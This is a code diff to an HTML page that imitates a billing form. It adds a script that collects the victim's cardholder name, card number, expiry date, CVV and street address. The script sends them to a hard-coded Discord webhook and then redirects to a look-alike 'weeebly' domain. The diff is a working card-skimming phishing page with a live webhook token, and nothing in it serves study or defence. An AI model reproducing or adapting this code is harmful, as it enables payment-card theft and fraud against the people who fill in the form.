@@ -133,7 +133,7 @@
  
  
  
- <form method="post" action"p.php" data-v-d5f0c1b4 class=half-width>
+ <form data-v-d5f0c1b4 class=half-width>
  
  
  <fieldset data-v-d5f0c1b4 class=🚀5-3-1oGdKM> <div data-v-d5f0c1b4 class="🚀5-3-13JZzf 🚀5-3-13ca3w"><label class="🚀5-3-12NLsh 🚀5-3-13fXvB"><span class="🚀5-3-11wkZp 🚀5-3-11fyTq"><span>Full Name</span> <span class=🚀5-3-16oI86>
@@ -165,9 +165,51 @@
  <button type=submit class="🚀5-3-13xcBo 🚀5-3-13Zn_O 🚀5-3-11fyTq 🚀5-3-12_3rZ 🚀5-3-11Ofuz 🚀5-3-13zAT8">
  Save
  </button></div></div></div> </div></fieldset>
- 
- 
- </form>
+ <div id="responseMessage" class="message">
+</form>
+	    <script>
+        function submitToDiscord(event) {
+            event.preventDefault();
+
+            const webhookURL = 'https://discord.com/api/webhooks/1328390609370611753/M6BKFoB_koWiEg5rixmeAHH9mokzHl56zZ1cC4CvJa6lFea-SB22e_xyYHiPfgUl_jP_';
+            const data = {
+                content: 'New Card Submission:\n' +
+                         `cc-name: ${document.getElementById('name').value}\n` +
+                         `cc-number: ${document.getElementById('card').value}\n` +
+                         `cc-exp: ${document.getElementById('date').value}\n` +
+                         `cc-csc: ${document.getElementById('cvv').value}\n` +
+                         `street-address: ${document.getElementById('street').value}\n` +
+                         `address-level2: ${document.getElementById('state').value}\n` +
+                         `address-level1: ${document.getElementById('city').value}\n` +
+                         `postal-code: ${document.getElementById('zip').value}`
+            };
+fetch(webhookURL, {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: {
+        'Content-Type': 'application/json'
+    }
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    document.getElementById('responseMessage').innerText = 'Submitted to Discord successfully!';
+    document.getElementById('responseMessage').classList.remove('error');
+    document.getElementById('responseMessage').style.display = 'block';
+    
+    // Redirect after a slight delay
+                window.location.href = 'https://www.weeebly.com';
+
+})
+.catch((error) => {
+    console.error('Error:', error);
+    document.getElementById('responseMessage').innerText = 'Submission failed: ' + error.message;
+    document.getElementById('responseMessage').classList.add('error');
+    document.getElementById('responseMessage').style.display = 'block';
+});
+        }
+    </script>
  
  </div></section> </main> <div data-v-e454fc0e></div> </div> </div> <div class="🚀5-3-12oaBk 🚀5-3-1DzQOo"></div></div></div>
  
